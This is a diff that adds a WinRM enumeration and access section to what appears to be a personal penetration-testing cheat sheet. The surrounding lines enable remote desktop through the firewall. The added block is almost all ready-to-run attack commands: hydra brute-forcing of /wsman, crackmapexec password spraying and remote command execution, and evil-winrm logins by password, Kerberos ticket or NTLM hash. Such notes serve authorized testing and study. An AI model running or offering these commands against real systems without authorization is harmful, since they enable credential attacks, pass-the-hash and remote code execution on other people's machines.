@@ -179,3 +179,43 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 xfreerdp /v:192.168.2.200 /u:domain_user  /d:UAP.local +clipboard /dynamic-resolution /drive:/home/kali/Download/,share
 
 ```
+
+
+Port 5985/5986 enumeration :
+```bash
+nmap -p 5985,5986 <target>
+nmap --script http-title -p 5985,5986 <target>
+nmap --script http-enum -p 5985 <target>
+
+curl -s -k -u '' https://<target>:5986/wsman
+
+hydra -L users.txt -P passwords.txt <target> -s 5985 http-get /wsman
+
+crackmapexec winrm <target> -u users.txt -p 'Password123!'
+crackmapexec winrm <target> -u users.txt -p passwords.txt
+crackmapexec winrm <target> -u <user> -p <pass>
+crackmapexec winrm <target> -u <user> -p <pass> -x "whoami"
+
+evil-winrm -i <target> -u <user> -p <pass>
+
+#you already have a valid Kerberos TGT
+export KRB5CCNAME=<ticket.ccache>
+evil-winrm -i <target> -r <domain> -u <user> -k
+
+#Check if WinRM is Enabled (From AD)
+Get-Item WSMan:\localhost\Client\TrustedHosts
+winrm quickconfig
+
+crackmapexec winrm <target> --enabled
+
+evil-winrm -i <target> -u <user> -H <NTLM_hash>
+crackmapexec winrm <target> -u <user> -H <NTLM_hash>
+
+Invoke-Command -ComputerName <target> -Credential <domain\user> -ScriptBlock { whoami }
+
+
+
+
+
+
+```
